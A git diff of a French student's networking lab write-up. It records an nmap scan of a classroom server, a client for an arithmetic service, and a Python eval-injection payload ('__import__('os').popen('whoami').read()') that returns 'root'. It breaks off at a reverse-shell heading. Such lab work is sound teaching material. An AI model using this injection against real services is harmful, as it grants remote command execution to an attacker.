@@ -44,32 +44,46 @@ SYN Stealth Scan Timing: About 100.00% done; ETC: 10:33 (0:00:00 remaining)
 Nmap scan report for 10.33.64.9
 Host is up (0.0050s latency).
 ```
+
 ```
-[voir trame wireshark](./tp5.nmap.pcapgn)
+voir : tp5_nmap.pcapng et tp5_nmap.txt
 ```
 
 🌞 Connectez-vous au serveur
 
-éditer le code du client pour qu'il se connecte à la bonne IP et au bon port
-utilisez l'application !
-vous devez déterminer, si c'est pas déjà fait, à quoi sert l'application
+```
+Nmap scan report for 🌞10.33.66.78🌞
+Host is up (0.045s latency).
 
+PORT      STATE SERVICE
+13337/tcp 🌞open🌞  unknown
+MAC Address: E4:B3:18:48:36:68 (Intel Corporate)
+```
 
-2. Exploit
-➜ On est face à une application qui, d'une façon ou d'une autre, prend ce que le user saisit, et l'évalue.
-Ca doit lever un giga red flag dans votre esprit de hacker ça. Tu saisis ce que tu veux, et le serveur le lit et l'interprète.
+```
+PS D:\Reseau-Linux\R-seau_B2\TP5> python .\client.py
+Veuillez saisir une opération arithmétique : 4+4
+'8'
+PS D:\Reseau-Linux\R-seau_B2\TP5>
+```
+
+```
+L'application sert à faire des opérations
+```
+
 🌞 Injecter du code serveur
 
-démerdez-vous pour arriver à faire exécuter du code arbitraire au serveur
-tu sais comment te co au serveur, et tu sais que ce que tu lui envoies, il l'évalue
-vous pouvez normalement avoir une injection de code :
+Elements modifiés
+```
+import os
+userMessage = "__import__('os').popen('whoami').read()"
+```
 
-exécuter du code Python
-et normalement, exécuter des commandes shell depuis cette injection Python
-
-
-
-
+```
+PS D:\Reseau-Linux\R-seau_B2\TP5> python .\client.py
+'root\n'
+PS D:\Reseau-Linux\R-seau_B2\TP5>
+```
 
 3. Reverse shell
 ➜ Injecter du code c'est bien mais...
